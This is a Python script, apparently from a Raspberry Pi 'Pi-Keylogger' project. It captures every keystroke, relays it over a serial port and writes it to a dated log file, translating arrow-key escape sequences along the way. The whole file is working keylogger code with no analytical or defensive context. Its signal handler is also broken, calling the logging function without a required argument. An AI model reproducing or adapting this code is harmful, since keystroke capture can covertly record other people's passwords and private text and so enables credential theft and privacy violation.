import getch
import signal
import time
import serial

def handler(signum, frame):
    log(chr(26))

def log(char, date):
    print("This is the char code " + str(ord(char)))
    ser.write(char.encode())  # Ensure correct encoding for serial write

    if ord(char) == 5:
        exit()
    elif ord(char) == 13:
        char = "\n"
    elif ord(char) == 127:
        char = " Backspace "
    elif ord(char) == 218:
        char = " UpArrow "
    elif ord(char) == 217:
        char = " DownArrow "
    elif ord(char) == 216:
        char = " LeftArrow "
    elif ord(char) == 215:
        char = " RightArrow "

    with open("/home/rikka/Pi-Keylogger/log/" + date + ".txt", "a+") as f:
        f.write(char)

def arrow(char):
    if ord(char) == 65:
        return 218
    elif ord(char) == 67:
        return 215
    elif ord(char) == 68:
        return 216
    elif ord(char) == 66:
        return 217
    else:
        return 0

ser = serial.Serial("/dev/ttyS0", 9600, timeout=2)
date = time.strftime("%c").replace(" ", "-")

print(date)

with open("/home/rikka/Pi-Keylogger/log/" + date + ".txt", "w+") as f:
    f.write("Started at " + date + "\n")

signal.signal(signal.SIGTSTP, handler)

while True:
    try:
        try:
            char = getch.getch()
            if ord(char) == 27:
                _char = getch.getch()
                if ord(_char) == 91:
                    char = chr(arrow(getch.getch()))
                    log(char, date)
                else:
                    log(char, date)
                    log(_char, date)
            else:
                log(char, date)
        except KeyboardInterrupt:
            pass
    except KeyboardInterrupt:
        log(chr(3), date)
    except OverflowError:
        pass
